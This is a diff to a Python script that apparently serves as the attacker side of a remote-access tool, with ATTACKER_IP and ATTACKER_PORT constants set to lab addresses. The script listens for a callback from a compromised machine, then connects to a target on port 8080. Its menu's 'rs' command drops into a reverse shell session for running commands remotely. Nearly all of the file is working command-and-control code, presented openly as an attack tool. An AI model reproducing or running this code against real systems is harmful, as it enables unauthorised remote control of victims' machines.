@@ -2,14 +2,78 @@ import socket
 from time import sleep
 
 
-def valid(message):
-    if message == "exit":
-        return True
-    else:
-        return False
+TARGET_IP = "192.168.68.107"
+TARGET_PORT = 8080
+
+ATTACKER_IP = "192.168.68.100"
+ATTACKER_PORT = 4444
+
+def awaitConfirmation():
+    # | 1.src addr | 2. skt init | 3.bind | 4.listen | 5.new skt | 6.recv | 7.sendall |
+
+    print("[*] Init stage 1")
+
+    sktrec = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    sktrec.bind((ATTACKER_IP, ATTACKER_PORT))
+    try:
+        print("[*] Waiting for connection")
+        sktrec.listen(1)
+
+        conn, addr = sktrec.accept()
+        print(f"[*] Connection established with {addr}")
+
+        message = conn.recv(1024).decode("utf-8") #
+        print(f" > {message}")
+
+        conn.close()
+    except socket.error as e:
+        print(f"[!] Could not connect to server {e}")
+    finally:
+        sktrec.close()
+
+def sendCommand():
+    # | 1. dst addr | 2. skt | 3. connect | 4. sendall
+    print("[>>>] stage 2")
+
+
+    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        skt.connect((TARGET_IP, TARGET_PORT))
+        print("[*] Connection established")
+
+        response = skt.recv(1024).decode("utf-8")
+        print(f" > {response}")
+
+        mainMenu(skt)
+
+
+    except socket.error as e:
+        print(f"[!] Could not connect to server {e}")
+
+def mainMenu(skt):
+    print("[*] Main Menu")
+    RUN = True
+    while RUN:
+
+        message = input("Enter your message: ")
+
+        if message == "exit":
+            skt.sendall(message.encode("utf-8"))
+            RUN = False
+            skt.close()
+
+        elif message == "rs":
+            skt.sendall(message.encode("utf-8"))
+
+            response = skt.recv(1024).decode("utf-8")
+            print(f" > {response}")
+            reverseShell(skt)
+            print("[*] Back to menu")
+        else:
+            print("[!] Command was not recognised, try again...")
 
 def reverseShell(skt):
-
 
     skt.settimeout(0.2)
     try:
@@ -40,86 +104,11 @@ def reverseShell(skt):
                 break
 
         if command == "exit":
+            print()
             break
 
     skt.settimeout(None)
 
-
-
-def sendCommand():
-    # | 1. dst addr | 2. skt | 3. connect | 4. sendall
-    print("[>>>] stage 2")
-
-    PORT = 8080
-    SERVER_IP = "10.0.0.14"
-
-    RUN = True
-
-
-    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        skt.connect((SERVER_IP, PORT))
-        print("[*] Connection established")
-
-        response = skt.recv(1024).decode("utf-8")
-        print(f"[*] Received {response}")
-
-        while RUN:
-            print("[*] Main Menu")
-
-            message = input("Enter your message: ")
-
-            skt.sendall(message.encode("utf-8"))
-            print("[*] Sent message")
-
-            if valid(message):
-                RUN = False
-                skt.close()
-            if message == "rs":
-                response = skt.recv(1024).decode("utf-8")
-                print(f"[*] Received {response}")
-                reverseShell(skt)
-                print("[*] Back to menu")
-    except socket.error as e:
-        print(f"[!] Could not connect to server {e}")
-
-
-
-def awaitConfirmation():
-    # | 1.src addr | 2. skt init | 3.bind | 4.listen | 5.new skt | 6.recv | 7.sendall |
-
-    global conn
-    RUN = True
-    print("[*] Init stage 1")
-
-    proceed = "2".encode("utf-8")
-
-    sktrec = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host = '10.0.0.8'
-    port = 4444
-    sktrec.bind((host, port))
-    try:
-        print("[*] Waiting for connection")
-        sktrec.listen(1)
-        while RUN:
-            conn, addr = sktrec.accept()
-            print(f"[*] Connection established with {addr}")
-
-            message = conn.recv(1024).decode("utf-8") #
-            print(f"[>] Received {message}")
-            command = input("[&] Enter command: ")
-            conn.sendall(command.encode("utf-8")) #
-            if command == "1":
-                message = conn.recv(1024).decode("utf-8")
-                if message == "proceeding":
-                    RUN = False
-
-
-        conn.close()
-    except socket.error as e:
-        print(f"[!] Could not connect to server {e}")
-    finally:
-        sktrec.close()
 
 
 awaitConfirmation()
